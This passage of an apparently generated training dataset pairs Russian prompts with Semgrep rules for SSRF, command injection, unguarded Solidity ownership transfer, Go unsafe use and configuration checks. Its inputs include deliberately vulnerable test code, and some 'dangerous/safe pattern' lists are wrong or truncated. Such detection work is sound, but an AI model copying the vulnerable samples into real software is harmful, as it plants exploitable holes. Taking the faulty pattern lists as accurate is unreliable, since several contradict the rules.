    "output": "rules:\n- id: express-puppeteer-injection\n  message: >-\n    If unverified user data can reach the `puppeteer` methods it can result in Server-Side Request Forgery\n    vulnerabilities\n  metadata:\n    owasp:\n    - A10:2021 - Server-Side Request Forgery (SSRF)\n    cwe:\n    - 'CWE-918: Server-Side Request Forgery (SSRF)'\n    category: security\n    technology:\n    - express\n    references:\n    - https://pptr.dev/api/puppeteer.page\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - javascript\n  - typescript\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: function ... ($REQ, $RES) {...}\n      - pattern-inside: function ... ($REQ, $RES, $NEXT) {...}\n      - patterns:\n        - pattern-either:\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES) {...})\n          - pattern-inside: $APP.$METHOD(..., function $FUNC($REQ, $RES, $NEXT) {...})\n        - metavariable-regex:\n            metavariable: $METHOD\n            regex: ^(get|post|put|head|delete|options)$\n    - pattern-either:\n      - pattern: $REQ.query\n      - pattern: $REQ.body\n      - pattern: $REQ.params\n      - pattern: $REQ.cookies\n      - pattern: $REQ.headers\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response, $NEXT: NextFunction) =>\n          {...}\n      - pattern-inside: |\n          ({ $REQ }: Request,$RES: Response) => {...}\n    - focus-metavariable: $REQ\n    - pattern-either:\n      - pattern: params\n      - pattern: query\n      - pattern: cookies\n      - pattern: headers\n      - pattern: body\n  pattern-sinks:\n  - patterns:\n    - pattern-either:\n      - pattern-inside: |\n          require('puppeteer');\n          ...\n      - pattern-inside: |\n          import 'puppeteer';\n          ...\n    - pattern-either:\n      - pattern: $PAGE.goto($SINK,...)\n      - pattern: $PAGE.setContent($SINK,...)\n      - pattern: $PAGE.evaluate($SINK,...)\n      - pattern: $PAGE.evaluate($CODE,$SINK,...)\n      - pattern: $PAGE.evaluateHandle($SINK,...)\n      - pattern: $PAGE.evaluateHandle($CODE,$SINK,...)\n      - pattern: $PAGE.evaluateOnNewDocument($SINK,...)\n      - pattern: $PAGE.evaluateOnNewDocument($CODE,$SINK,...)\n    - focus-metavariable: $SINK\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования методов puppeteer (page.goto, page.setContent, page.evaluate и др.) с пользовательскими данными, которые могут быть переданы напрямую без проверки. Это может привести к SSRF-уязвимостям, так как злоумышленник сможет контролировать URL или контент, загружаемый через эти методы. Источниками данных являются запросы пользователя (query, body, params, cookies, headers), а методами-поглотителями считаются вызовы методов puppeteer с передачей этих данных.\n\n# Ключевые элементы:\n- ID: express-puppeteer-injection\n- Язык: javascript \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "express-puppeteer-injection",
      "language": "javascript",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения avoid-operations-with-limits-in-loops\nОписание уязвимости: Database class methods, DML operations, SOQL queries, SOSL queries, Approval class methods, Email sending, async scheduling or queueing within loops can cause governor limit exceptions. Instead, try to batch up the data into a list and invoke the operation once on that list of data outside the loop.\nCWE: \nТип анализа: search\nЯзык: generic",
    "input": "Требования:\n- Язык: generic\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: AvoidOperationsWithLimitsInLoops.cls\npublic class AvoidOperationsWithLimitsInLoops {\n\tpublic void messageInsideOfLoop() {\n\t\tfor (Integer i = 0; i < 151; i++) {\n\t\t\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tMessaging.sendEmail(new Messaging.SingleEmailMessage[]{email});\n\t\t}\n\t}\n\n\tpublic void messageInsideOfLoop2() {\n\t\tfor (Account a : accounts) {\n\t\t\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tMessaging.sendEmail(new Messaging.SingleEmailMessage[]{email});\n\t\t}\n\t}\n\n\tpublic void messageInsideOfLoop3() {\n\t\twhile (someCondition) {\n\t\t\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tMessaging.sendEmail(new Messaging.SingleEmailMessage[]{email});\n\t\t}\n\t}\n\n\tpublic void messageInsideOfLoop4() {\n\t\tdo {\n\t\t\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tMessaging.sendEmail(new Messaging.SingleEmailMessage[]{email});\n\t\t} while (someCondition);\n\t}\n\n\tpublic void approvalInsideOfLoop() {\n\t\tfor (Integer i = 0; i < 151; i++) {\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tApproval.ProcessSubmitRequest req = new Approval.ProcessSubmitRequest();\n\t\t\treq.setObjectId(acc.Id);\n\t\t\tApproval.process(req);\n\t\t\tApproval.lock(acc);\n\t\t\tApproval.unlock(acc);\n\t\t}\n\t}\n\n\tpublic void approvalInsideOfLoop2() {\n\t\tfor (Account a : accounts) {\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tApproval.ProcessSubmitRequest req = new Approval.ProcessSubmitRequest();\n\t\t\treq.setObjectId(acc.Id);\n\t\t\tApproval.process(req);\n\t\t\tApproval.lock(acc);\n\t\t\tApproval.unlock(acc);\n\t\t}\n\t}\n\n\t\tpublic void approvalInsideOfLoop3() {\n\t\twhile (someCondition) {\n\t\t\t// ruleid: avoid-operations-with-limits-in-loops\n\t\t\tApproval.ProcessSubmitRequest req = new Approval.ProcessSubmitRequest();\n\t\t  # Ограничиваем длину\n\nОпасные паттерны:\n• for (Integer i = 0; i < 151; i++) {\n\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t// ruleid: avoid-operations-with-limits-in-loops\n\tMessaging.sendEmail(new Messaging.Singl\n• for (Account a : accounts) {\n\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t// ruleid: avoid-operations-with-limits-in-loops\n\tMessaging.sendEmail(new Messaging.SingleEmailM\n• while (someCondition) {\n\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\t// ruleid: avoid-operations-with-limits-in-loops\n\tMessaging.sendEmail(new Messaging.SingleEmailMessag\n\nБезопасные паттерны:  \n• List<Messaging.SingleEmailMessage> emails = new List<Messaging.SingleEmailMessage>();\nfor (Integer i = 0; i < 151; i++){\n\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\temai\n• List<Account> accountsToProcess = new List<Account>(accounts);\nfor (Account a : accountsToProcess) {\n\tMessaging.SingleEmailMessage email = new Messaging.SingleEmailMessage();\n\temail.setToAddresses(a.g\n• List<Approval.ProcessSubmitRequest> requests = new List<Approval.ProcessSubmitRequest>();\nfor (Account a : accounts) {\n\tApproval.ProcessSubmitRequest request = new Approval.ProcessSubmitRequest();\n\tre\n\nЛегенда аннотаций:\n- // ruleid:avoid-operations-with-limits-in-loops: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:avoid-operations-with-limits-in-loops: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: avoid-operations-with-limits-in-loops\n    min-version: 1.44.0\n    severity: ERROR\n    languages:\n      - generic\n    metadata:\n      category: performance\n      references:\n      - https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/apex_gov_limits.htm\n      technology:\n      - salesforce\n    message: >-\n      Database class methods, DML operations, SOQL queries, SOSL queries,\n      Approval class methods, Email sending, async scheduling or queueing\n      within loops can cause governor limit exceptions. Instead, try to\n      batch up the data into a list and invoke the operation once on that\n      list of data outside the loop.\n    patterns:\n      - pattern-either:\n          - pattern-inside: |\n              for (...) {\n                ...\n              }\n          - pattern-inside: |\n              while (...) {\n                ...\n              }\n          - pattern-inside: |\n              do {\n                ...\n              } while (...);\n      - pattern-either:\n        - pattern: |\n            Messaging.sendEmail(...);\n        - pattern: |\n            Approval.ProcessSubmitRequest $REQUEST = new Approval.ProcessSubmitRequest();\n        - pattern: |\n            System.enqueueJob(...);\n        - pattern: |\n            System.schedule(...);\n        - pattern: |\n            System.scheduleBatch(...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов методов, которые могут привести к превышению лимитов Salesforce при их вызове внутри циклов. Оно использует шаблон поиска, который проверяет наличие конструкций цикла (for, while, do-while), а затем ищет конкретные методы, такие как Messaging.sendEmail, Approval.ProcessSubmitRequest, System.enqueueJob, System.schedule и System.scheduleBatch. Эти методы вызывают ограничения системы управления исполнением (governor limits) и должны быть выполнены за пределами цикла для предотвращения ошибок.\n\n# Ключевые элементы:\n- ID: avoid-operations-with-limits-in-loops\n- Язык: generic \n- Тип: \n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "avoid-operations-with-limits-in-loops",
      "language": "generic",
      "severity": "ERROR",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Сгенерируй правило Semgrep для поиска: yaml-key-indentation-check\nОписание уязвимости: It looks like you have an YAML indentation issue -- instead of writing `$KEY`,  put a space between the hyphen and what comes after! Otherwise, it reads  as a single string. \nCWE: \nТип анализа: search\nЯзык: yaml",
    "input": "Требования:\n- Язык: yaml\n- Тип анализа: search\n- CWE: \n- Серьезность: WARNING\n\nКонтекст кода:\n// File: key-indentation.test.yaml\nrules:\n  - id: yaml-key-indentation-check-example \n    message: >-\n      There should be a finding here, because the YAML\n      fuses the hyphen and the key together! \n    languages:\n      - js\n    severity: WARNING\n    patterns:\n      # ruleid: yaml-key-indentation-check \n      -pattern: |\n        bar\n    patterns-again:\n      # ok: yaml-key-indentation-check \n      - pattern: |\n            bar  # Ограничиваем длину\n\nОпасные паттерны:\n• rules:\n  - foo: bar\n  - baz: qux\n• my-config:\n  -key: value\n• settings:\n  -name: John\n\nБезопасные паттерны:  \n• rules:\n  - foo : bar\n  - baz : qux\n• my-config:\n  - key : value\n• settings:\n  - name : John\n\nЛегенда аннотаций:\n- // ruleid:yaml-key-indentation-check: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:yaml-key-indentation-check: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: yaml-key-indentation-check\n    message: \"It looks like you have an YAML indentation issue -- instead of writing\n      `$KEY`,  put a space between the hyphen and what comes after! Otherwise,\n      it reads  as a single string. \"\n    languages:\n      - yaml\n    severity: WARNING\n    metadata:\n      references:\n        - https://semgrep.dev/docs/contributing/contributing-to-semgrep-rules-repository\n      category: correctness\n      technology:\n        - semgrep\n    pattern-either:\n      - patterns:\n          - pattern-inside: |\n              rules: ...\n          - pattern: |\n              $KEY: >-\n                $VALUE\n          - focus-metavariable: $KEY\n          - metavariable-regex:\n              metavariable: $KEY\n              regex: ^-(\\w*)$\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска проблем с отступами в ключах YAML-файлов. Оно использует комбинацию шаблонов и метавариаблей для выявления случаев, когда ключи записаны без пробела после дефиса. Первый шаблон ищет ключевые слова 'rules:' внутри блока, второй шаблон проверяет наличие ключа, начинающегося с дефиса и за которым следует идентификатор без пробела. Шаблон фокусируется на метавариабле $KEY и использует регулярное выражение для проверки формата ключей.\n\n# Ключевые элементы:\n- ID: yaml-key-indentation-check\n- Язык: yaml \n- Тип: \n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "yaml-key-indentation-check",
      "language": "yaml",
      "severity": "WARNING",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: use-of-unsafe-block\nОписание уязвимости: Using the unsafe package in Go gives you low-level memory management and many of the strengths of the C language, but also steps around the type safety of Go and can lead to buffer overflows and possible arbitrary code execution by an attacker. Only use this package if you absolutely know what you're doing.\nCWE: CWE-242: Use of Inherently Dangerous Function\nТип анализа: search\nЯзык: go",
    "input": "Требования:\n- Язык: go\n- Тип анализа: search\n- CWE: CWE-242: Use of Inherently Dangerous Function\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: unsafe.go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"unsafe\"\n\n\tfoobarbaz \"unsafe\"\n)\n\ntype Fake struct{}\n\nfunc (Fake) Good() {}\nfunc main() {\n\tunsafeM := Fake{}\n\tunsafeM.Good()\n\tintArray := [...]int{1, 2}\n\tfmt.Printf(\"\\nintArray: %v\\n\", intArray)\n\tintPtr := &intArray[0]\n\tfmt.Printf(\"\\nintPtr=%p, *intPtr=%d.\\n\", intPtr, *intPtr)\n\t// ruleid: use-of-unsafe-block\n\taddressHolder := uintptr(foobarbaz.Pointer(intPtr)) + unsafe.Sizeof(intArray[0])\n\t// ruleid: use-of-unsafe-block\n\tintPtr = (*int)(foobarbaz.Pointer(addressHolder))\n\tfmt.Printf(\"\\nintPtr=%p, *intPtr=%d.\\n\\n\", intPtr, *intPtr)\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• addressHolder := uintptr(foobarbaz.Pointer(intPtr)) + unsafe.Sizeof(intArray[0])\n• intPtr = (*int)(foobarbaz.Pointer(addressHolder))\n\nБезопасные паттерны:  \n• unsafeM := Fake{}\n• fmt.Printf(\"\nintArray: %v\\n\", intArray)\n\nЛегенда аннотаций:\n- // ruleid:use-of-unsafe-block: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:use-of-unsafe-block: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: use-of-unsafe-block\n  message: >-\n    Using the unsafe package in Go gives you low-level memory management and many of the strengths of\n    the C language, but also steps around the type safety of Go and can lead to buffer overflows and\n    possible arbitrary code execution by an attacker.\n    Only use this package if you absolutely know what you're doing.\n  languages: [go]\n  severity: WARNING\n  metadata:\n    cwe:\n    - 'CWE-242: Use of Inherently Dangerous Function'\n    source_rule_url: https://github.com/securego/gosec/blob/master/rules/unsafe.go\n    category: security\n    technology:\n    - go\n    confidence: LOW\n    references:\n    - https://cwe.mitre.org/data/definitions/242.html\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n  pattern: unsafe.$FUNC(...)\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования пакета unsafe в Go-коде. Анализируется вызов функций, начинающихся с префикса 'unsafe.', с использованием эллипсиса (...) для соответствия любым аргументам функции. Опасный пример включает прямое обращение к низкоуровневым функциям памяти, которые могут привести к переполнению буфера или выполнению произвольного кода. Безопасный пример избегает таких вызовов.\n\n# Ключевые элементы:\n- ID: use-of-unsafe-block\n- Язык: go \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "use-of-unsafe-block",
      "language": "go",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-elasticsearch-nodetonode-encryption-not-enabled\nОписание уязвимости: Ensure all Elasticsearch has node-to-node encryption enabled.\t\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: aws-elasticsearch-nodetonode-encryption.tf\n# pass\nresource \"aws_elasticsearch_domain\" \"without_cluster_config\" {\n  domain_name           = \"without_cluster_config\"\n}\n\nresource \"aws_elasticsearch_domain\" \"without_instance_count\" {\n  domain_name           = \"without_instance_count\"\n\n  cluster_config {}\n}\n\nresource \"aws_elasticsearch_domain\" \"instance_count_not_bigger_than_1\" {\n  domain_name           = \"instance_count_not_bigger_than_1\"\n\n  cluster_config {\n    instance_count = 1 // a value <= 1\n  }\n}\n\nresource \"aws_elasticsearch_domain\" \"node_to_node_encryption_enabled\" {\n  domain_name           = \"node_to_node_encryption_enabled\"\n\n  cluster_config {\n    instance_count = 2 // a value > 1\n  }\n\n  node_to_node_encryption {\n    enabled = true\n  }\n}\n\nresource \"aws_elasticsearch_domain\" \"old_hcl\" {\n  domain_name           = \"old_hcl\"\n\n  cluster_config = {\n    instance_count = 2\n  }\n\n  node_to_node_encryption = {\n    enabled = true\n  }\n}\n\n# fail\n# ruleid: aws-elasticsearch-nodetonode-encryption-not-enabled\nresource \"aws_elasticsearch_domain\" \"node_to_node_encryption_disabled\" {\n  domain_name           = \"node_to_node_encryption_disabled\"\n\n  cluster_config {\n    instance_count = 2 // a value > 1\n  }\n\n  node_to_node_encryption {\n    enabled = false\n  }\n}\n# ruleid: aws-elasticsearch-nodetonode-encryption-not-enabled\nresource \"aws_elasticsearch_domain\" \"node_to_node_encryption_doesnt_exist\" {\n  domain_name           = \"node_to_node_encryption_doesnt_exist\"\n\n  cluster_config {\n    instance_count = 2 // a value > 1\n  }\n}\n\n# unknown\nresource \"aws_elasticsearch_domain\" \"instance_count_not_number\" {\n  domain_name           = \"instance_count_not_number\"\n\n  cluster_config {\n    instance_count = \"not_int\"\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"aws_elasticsearch_domain\" \"node_to_node_encryption_disabled\" { ... node_to_node_encryption { enabled = false } ...}\n• resource \"aws_elasticsearch_domain\" \"node_to_node_encryption_doesnt_exist\" { ... cluster_config { instance_count = 2 } ...}\n\nБезопасные паттерны:  \n• resource \"aws_elasticsearch_domain\" \"node_to_node_encryption_enabled\" { ... cluster_config { instance_count = 2 } ... node_to_node_encryption { enabled = true } }\n• resource \"aws_elasticsearch_domain\" \"old_hcl\" { ... cluster_config = { instance_count = 2 } ... node_to_node_encryption = { enabled = true } }\n\nЛегенда аннотаций:\n- // ruleid:aws-elasticsearch-nodetonode-encryption-not-enabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-elasticsearch-nodetonode-encryption-not-enabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-elasticsearch-nodetonode-encryption-not-enabled\n  patterns:\n  - pattern-either:\n    - pattern: |\n        resource \"aws_elasticsearch_domain\" $ANYTHING {\n          ...\n          node_to_node_encryption {\n            ...\n            enabled = false\n            ...\n          }\n          ...\n        }\n    - pattern: |\n        resource \"aws_elasticsearch_domain\" $ANYTHING {\n          ...\n          cluster_config {\n            ...\n            instance_count = $COUNT\n            ...\n          }\n        }\n  - pattern-not-inside: |\n      resource \"aws_elasticsearch_domain\" $ANYTHING {\n        ...\n        cluster_config {\n          ...\n          instance_count = $COUNT\n          ...\n        }\n        node_to_node_encryption {\n          ...\n          enabled = true\n          ...\n        }\n      }\n  - metavariable-comparison:\n      metavariable: $COUNT\n      comparison: $COUNT > 1\n  message: >-\n    Ensure all Elasticsearch has node-to-node encryption enabled.\t\n  metadata:\n    category: security\n    technology:\n    - terraform\n    - aws\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    references:\n    - https://owasp.org/Top10/A02_2021-Cryptographic_Failures\n    subcategory:\n    - vuln\n    likelihood: LOW\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска конфигураций AWS Elasticsearch Domains, где не включена функция node-to-node encryption. Анализ выполняется путем поиска ресурсов aws_elasticsearch_domain с установленным параметром node_to_node_encryption.enabled равным false или отсутствующим полностью, при условии, что параметр cluster_config.instance_count больше 1. Правило также исключает случаи, когда node_to_node_encryption присутствует и явно включен.\n\n# Ключевые элементы:\n- ID: aws-elasticsearch-nodetonode-encryption-not-enabled\n- Язык: hcl \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "aws-elasticsearch-nodetonode-encryption-not-enabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: tainted-cmd-from-http-request\nОписание уязвимости: Detected input from a HTTPServletRequest going into a 'ProcessBuilder' or 'exec' command. This could lead to command injection if variables passed into the exec commands are not properly sanitized. Instead, avoid using these OS commands with user-supplied input, or, if you must use these commands, use a whitelist of specific values.\nCWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\nТип анализа: taint\nЯзык: java\nИсточники (sources): определены в правиле\nСинки (sinks): определены в правиле",
    "input": "Требования:\n- Язык: java\n- Тип анализа: taint\n- CWE: CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: tainted-cmd-from-http-request.java\n/**\n * OWASP Benchmark v1.2\n *\n * <p>This file is part of the Open Web Application Security Project (OWASP) Benchmark Project. For\n * details, please see <a\n * href=\"https://owasp.org/www-project-benchmark/\">https://owasp.org/www-project-benchmark/</a>.\n *\n * <p>The OWASP Benchmark is free software: you can redistribute it and/or modify it under the terms\n * of the GNU General Public License as published by the Free Software Foundation, version 2.\n *\n * <p>The OWASP Benchmark is distributed in the hope that it will be useful, but WITHOUT ANY\n * WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR\n * PURPOSE. See the GNU General Public License for more details.\n *\n * @author Dave Wichers\n * @created 2015\n */\npackage org.owasp.benchmark.testcode;\n\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.lang.Runtime;\n\n@WebServlet(value = \"/cmdi-00/BenchmarkTest00006\")\npublic class bad1 extends HttpServlet {\n\n    private static final long serialVersionUID = 1L;\n\n    @Override\n    public void doGet(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        doPost(request, response);\n    }\n\n    @Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        // some code\n        response.setContentType(\"text/html;charset=UTF-8\");\n\n        String param = \"\";\n        if (request.getHeader(\"BenchmarkTest00006\") != null) {\n            param = request.getHeader(\"BenchmarkTest00006\");\n        }\n\n        // URL Decode the header value since req.getHeader() doesn't. Unlike req.getParameter().\n        param = java.net.URLDecoder.decode(param, \"UTF-8\");\n\n        jav  # Ограничиваем длину\n\nОпасные паттерны:\n• argList.add(\"echo \" + param);\n• pb.command(argList);\n• $ARGLIST.add(...);\n\nБезопасные паттерны:  \n• argList.add(\"echo \" + \"param\");\n• Process p = r.exec(args, argsEnv);\n\nЛегенда аннотаций:\n- // ruleid:tainted-cmd-from-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:tainted-cmd-from-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: tainted-cmd-from-http-request\n  message: >-\n    Detected input from a HTTPServletRequest going into a 'ProcessBuilder' or 'exec' command. This could\n    lead to command injection if variables passed into the exec commands are not properly sanitized. Instead,\n    avoid using these OS commands with user-supplied input, or, if you must use these commands, use a\n    whitelist of specific values.\n  languages: [java]\n  severity: ERROR\n  mode: taint\n  pattern-sources:\n  - patterns:\n    - pattern-either:\n      - pattern: |\n          (HttpServletRequest $REQ)\n      - patterns:   # this pattern is a hack to get the rule to recognize `map` as tainted source when `cookie.getValue(user_input)` is used.\n        - pattern-inside: |\n            (javax.servlet.http.Cookie[] $COOKIES) = (HttpServletRequest $REQ).getCookies(...);\n            ...\n            for (javax.servlet.http.Cookie $COOKIE: $COOKIES) {\n              ...\n            }\n        - pattern: |\n            $COOKIE.getValue(...)\n  pattern-sinks:\n      - patterns:\n          - pattern-either:\n              - pattern: |\n                  (ProcessBuilder $PB) = ...;\n              - patterns:\n                - pattern: |\n                    (Process $P) = ...;\n                - pattern-not: |\n                    (Process $P) = (java.lang.Runtime $R).exec(...);\n              - patterns:\n                  - pattern: (java.lang.Runtime $R).exec($CMD, ...);\n                  - focus-metavariable: $CMD\n              - patterns:\n                  - pattern-either:\n                      - pattern-inside: |\n                          (java.util.List<$TYPE> $ARGLIST) = ...;  \n                          ...\n                          (ProcessBuilder $PB) = ...;\n                          ...\n                          $PB.command($ARGLIST);\n                      - pattern-inside: |\n                          (java.util.List<$TYPE> $ARGLIST) = ...;  \n                          ...\n                          (ProcessBuilder $PB) = ...;\n                      - pattern-inside: |\n                          (java.util.List<$TYPE> $ARGLIST) = ...;  \n                          ...\n                          (Process $P) = ...;\n                  - pattern: |\n                      $ARGLIST.add(...);\n  metadata:\n    category: security\n    technology:\n    - java\n    cwe:\n    - \"CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\"\n    owasp:\n    - A01:2017 - Injection\n    - A03:2021 - Injection\n    references:\n    - https://owasp.org/Top10/A03_2021-Injection\n    cwe2022-top25: true\n    cwe2021-top25: true\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования переменных, полученных из HTTP-запроса, в командах ProcessBuilder или exec, которые могут привести к инъекции команд при недостаточной их очистке. Источниками считаются переменные, полученные через заголовки запроса или куки, а sinkами — команды, запускаемые с использованием этих переменных. Правило использует pattern-sources для идентификации источников и pattern-sinks для определения мест, где эти источники становятся sinkами.\n\n# Ключевые элементы:\n- ID: tainted-cmd-from-http-request\n- Язык: java \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "tainted-cmd-from-http-request",
      "language": "java",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "taint",
      "is_validation": true
    }
  },
  {
    "instruction": "Составь правило Semgrep для: unrestricted-transferownership\nОписание уязвимости: Unrestricted transferOwnership\nCWE: C\nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: C\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: unrestricted-transferownership.sol\n/**\n *Submitted for verification at BscScan.com on 2022-05-10\n*/\n\n/**\n *Submitted for verification at BscScan.com on 2021-07-02\n*/\n\n/*\n\nContract by DeFiSCI and Team - built on others previous work w/ a splash of DevTeamSix magic...\n\n*/\n\n// SPDX-License-Identifier: Unlicensed\n\npragma solidity ^0.8.4;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address payable) {\n        return payable(msg.sender);\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\n\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    \n\n}\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns  # Ограничиваем длину\n\nОпасные паттерны:\n• // ruleid: unrestricted-transferownership\nfunction transferOwnership(address newOwner) public {\n    _owner = newOwner;\n}\n• // ruleid: unrestricted-transferownership\nfunction transferOwnership(address newOwner) external {\n    _owner = newOwner;\n}\n\nБезопасные паттерны:  \n• // safe: unrestricted-transferownership\nfunction transferOwnership(address newOwner) public onlyOwner {\n    _owner = newOwner;\n}\n• // safe: unrestricted-transferownership\nfunction transferOwnership(address newOwner) external onlyOwner {\n    _owner = newOwner;\n}\n\nЛегенда аннотаций:\n- // ruleid:unrestricted-transferownership: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unrestricted-transferownership: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n -\n    id: unrestricted-transferownership\n    message: Unrestricted transferOwnership\n    metadata:\n        category: security\n        technology:\n            - solidity\n        cwe: \"CWE-284: Improper Access Control\"\n        confidence: LOW\n        likelihood: HIGH\n        impact: HIGH\n        subcategory:\n            - vuln\n        references:\n        - https://medium.com/quillhash/decoding-ragnarok-online-invasion-44k-exploit-quillaudits-261b7e23b55\n        - https://www.bscscan.com/address/0xe48b75dc1b131fd3a8364b0580f76efd04cf6e9c\n    patterns:\n        - pattern-either:\n          - pattern: function transferOwnership(address $X) public {...}\n          - pattern: function transferOwnership(address $X) external {...}\n        - pattern-not: |\n            function transferOwnership(address $X) $M {...}\n        - pattern-not: |\n            function transferOwnership(address $X) $M(...) {...}\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              require(<... msg.sender ...>, ...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              require(<... _msgSender ...>, ...);\n              ...\n            }\n        - pattern-not: |\n            function transferOwnership(address $X) {\n              ...\n              if (<... msg.sender ...>) {\n                